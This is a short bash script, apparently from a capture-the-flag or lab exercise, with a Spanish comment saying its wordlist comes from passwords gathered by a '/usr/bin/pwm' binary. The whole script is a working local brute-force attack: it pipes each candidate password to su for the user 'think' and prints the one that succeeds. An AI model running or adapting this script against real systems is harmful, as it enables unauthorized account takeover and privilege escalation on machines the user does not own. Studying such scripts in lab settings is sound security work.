#!/bin/bash

_user="think"
_wordlist="/tmp/pwds" # Esta sería la ruta al archivo de contraseñas obtenidas por el binario '/usr/bin/pwm'

while IFS='' read -r pass; do

	if echo "$pass" | su "$_user" -c "echo SUCCESS" | grep -q "SUCCESS"; then
		echo -e  "\n [+] Password: $pass"
		break
	fi

done < "$_wordlist"
